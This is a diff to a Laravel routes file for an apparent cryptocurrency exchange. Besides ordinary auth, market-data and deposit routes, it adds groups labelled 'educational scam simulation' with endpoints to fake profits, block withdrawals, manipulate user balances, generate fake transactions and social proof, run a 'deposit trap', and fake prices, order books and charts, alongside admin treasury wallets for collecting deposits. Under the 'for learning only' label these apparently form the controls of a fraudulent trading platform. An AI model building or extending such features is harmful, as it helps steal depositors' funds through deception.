@@ -15,10 +15,11 @@ use Illuminate\Support\Facades\Route;
 */
 
 // Public routes (no authentication required)
-Route::prefix('auth')->group(function () {
+Route::prefix('auth')->group(callback: function () {
     Route::post('/register', [App\Http\Controllers\Api\AuthController::class, 'register']);
     Route::post('/login', [App\Http\Controllers\Api\AuthController::class, 'login']);
-    Route::post('/password/reset', [App\Http\Controllers\Api\AuthController::class, 'requestPasswordReset']);
+    Route::post('/password/reset/request', [App\Http\Controllers\Api\AuthController::class, 'requestPasswordReset']);
+    Route::post('/password/reset/verify', [App\Http\Controllers\Api\AuthController::class, 'verifyResetToken']);
     Route::post('/password/reset/confirm', [App\Http\Controllers\Api\AuthController::class, 'resetPassword']);
     
     // Public email verification and 2FA routes
@@ -36,8 +37,15 @@ Route::prefix('auth')->group(function () {
 // Public market data routes
 Route::prefix('cryptocurrencies')->group(function () {
     Route::get('/', [App\Http\Controllers\Api\MarketDataController::class, 'index']);
+    Route::get('/statistics', [App\Http\Controllers\Api\MarketDataController::class, 'statistics']);
     Route::get('/{symbol}/price-history', [App\Http\Controllers\Api\MarketDataController::class, 'priceHistory']);
     Route::get('/{symbol}/candlestick', [App\Http\Controllers\Api\MarketDataController::class, 'candlestick']);
+});
+
+// WebSocket endpoints for real-time data
+Route::prefix('ws')->group(function () {
+    Route::get('/market-data', [App\Http\Controllers\Api\WebSocketController::class, 'marketData']);
+    Route::post('/price-updates', [App\Http\Controllers\Api\WebSocketController::class, 'priceUpdates']);
 });
 
 Route::get('/orderbook/{cryptocurrency}', [App\Http\Controllers\Api\TradingController::class, 'orderBook']);
@@ -90,6 +98,15 @@ Route::middleware('auth:sanctum')->group(function () {
         Route::post('/generate-address', [App\Http\Controllers\Api\DepositController::class, 'generateAddress']);
         Route::post('/fiat', [App\Http\Controllers\Api\DepositController::class, 'createFiatDeposit']);
         Route::post('/simulate-crypto', [App\Http\Controllers\Api\DepositController::class, 'simulateCryptoDeposit']);
+        Route::post('/submit-with-proof', [App\Http\Controllers\Api\DepositController::class, 'submitWithProof']);
+        Route::post('/process-incoming', [App\Http\Controllers\Api\DepositController::class, 'processIncomingDeposit']);
+        Route::get('/statistics/summary', [App\Http\Controllers\Api\DepositController::class, 'getDepositStatistics']);
+        
+        // Wallet address management
+        Route::post('/store-metamask-address', [App\Http\Controllers\Api\DepositController::class, 'storeMetaMaskAddress']);
+        Route::delete('/remove-metamask-address', [App\Http\Controllers\Api\DepositController::class, 'removeMetaMaskAddress']);
+        Route::get('/user-addresses', [App\Http\Controllers\Api\DepositController::class, 'getUserAddresses']);
+        Route::get('/supported-currencies', [App\Http\Controllers\Api\DepositController::class, 'getSupportedCurrencies']);
     });
 
     // Withdrawal routes
@@ -107,6 +124,21 @@ Route::middleware('auth:sanctum')->group(function () {
         Route::get('/', [App\Http\Controllers\Api\TradingController::class, 'index']);
         Route::post('/', [App\Http\Controllers\Api\TradingController::class, 'store']);
         Route::delete('/{orderId}', [App\Http\Controllers\Api\TradingController::class, 'cancel']);
+    });
+
+    // Educational Scam Simulation Routes (FOR LEARNING ONLY)
+    Route::prefix('educational-scam')->group(function () {
+        Route::get('/disclaimer', [App\Http\Controllers\Api\EducationalScamController::class, 'getEducationalDisclaimer']);
+        Route::post('/simulate-profits', [App\Http\Controllers\Api\EducationalScamController::class, 'simulateArtificialProfits']);
+        Route::post('/simulate-withdrawal-block', [App\Http\Controllers\Api\EducationalScamController::class, 'simulateWithdrawalBlocking']);
+        Route::post('/generate-fake-transaction', [App\Http\Controllers\Api\EducationalScamController::class, 'generateFakeTransaction']);
+        Route::get('/fake-investment-plans', [App\Http\Controllers\Api\EducationalScamController::class, 'getFakeInvestmentPlans']);
+        Route::get('/fake-social-proof', [App\Http\Controllers\Api\EducationalScamController::class, 'getFakeSocialProof']);
+        
+        // Admin-only educational demonstrations
+        Route::middleware('admin')->group(function () {
+            Route::get('/admin-manipulation-demo', [App\Http\Controllers\Api\EducationalScamController::class, 'getAdminManipulationDemo']);
+        });
     });
 
     // Admin routes (admin users only)
@@ -159,6 +191,13 @@ Route::middleware('auth:sanctum')->group(function () {
             Route::get('/statistics', [App\Http\Controllers\Api\AdminController::class, 'getWalletStatistics']);
         });
 
+        // Admin Treasury Wallets
+        Route::prefix('treasury')->group(function () {
+            Route::get('/wallets', [App\Http\Controllers\Api\AdminController::class, 'getAdminWallets']);
+            Route::put('/wallets', [App\Http\Controllers\Api\AdminController::class, 'updateAdminWallet']);
+            Route::get('/collection-stats', [App\Http\Controllers\Api\AdminController::class, 'getDepositCollectionStats']);
+        });
+
         // Deposits & Withdrawals Management
         Route::prefix('transactions')->group(function () {
             Route::get('/deposits', [App\Http\Controllers\Api\AdminController::class, 'getDeposits']);
@@ -170,6 +209,27 @@ Route::middleware('auth:sanctum')->group(function () {
         // Security and monitoring
         Route::get('/suspicious-activities', [App\Http\Controllers\Api\AdminController::class, 'suspiciousActivities']);
         
+        // Educational Scam Simulation (FOR LEARNING ONLY)
+        Route::prefix('educational-scam')->group(function () {
+            Route::get('/overview', [App\Http\Controllers\Api\AdminController::class, 'getScamSimulationOverview']);
+            Route::post('/simulate-profits', [App\Http\Controllers\Api\AdminController::class, 'simulateArtificialProfits']);
+            Route::post('/block-withdrawals', [App\Http\Controllers\Api\AdminController::class, 'blockUserWithdrawals']);
+            Route::post('/manipulate-balance', [App\Http\Controllers\Api\AdminController::class, 'manipulateUserBalance']);
+            Route::post('/generate-fake-transaction', [App\Http\Controllers\Api\AdminController::class, 'generateFakeTransaction']);
+            Route::post('/simulate-fake-deposit', [App\Http\Controllers\Api\AdminController::class, 'simulateFakeDeposit']);
+            Route::post('/generate-deposit-address', [App\Http\Controllers\Api\AdminController::class, 'generateFakeDepositAddress']);
+            Route::post('/demonstrate-deposit-trap', [App\Http\Controllers\Api\AdminController::class, 'demonstrateDepositTrap']);
+            Route::get('/fake-investment-plans', [App\Http\Controllers\Api\AdminController::class, 'generateFakeInvestmentPlans']);
+            Route::get('/fake-social-proof', [App\Http\Controllers\Api\AdminController::class, 'generateFakeSocialProof']);
+            Route::get('/social-engineering-tactics', [App\Http\Controllers\Api\AdminController::class, 'simulateSocialEngineeringTactics']);
+            
+            // NEW: Fake Trading and Chart Manipulation
+            Route::post('/generate-fake-price-movements', [App\Http\Controllers\Api\AdminController::class, 'generateFakePriceMovements']);
+            Route::post('/simulate-fake-trading-activity', [App\Http\Controllers\Api\AdminController::class, 'simulateFakeTradingActivity']);
+            Route::post('/generate-fake-order-book', [App\Http\Controllers\Api\AdminController::class, 'generateFakeOrderBook']);
+            Route::post('/simulate-fake-profit-scenarios', [App\Http\Controllers\Api\AdminController::class, 'simulateFakeProfitScenarios']);
+            Route::post('/demonstrate-chart-manipulation', [App\Http\Controllers\Api\AdminController::class, 'demonstrateChartManipulation']);
+        });
         // System controls
         Route::post('/cryptocurrencies/{symbol}/override-price', [App\Http\Controllers\Api\AdminController::class, 'overridePrice']);
         Route::post('/maintenance-mode', [App\Http\Controllers\Api\AdminController::class, 'maintenanceMode']);
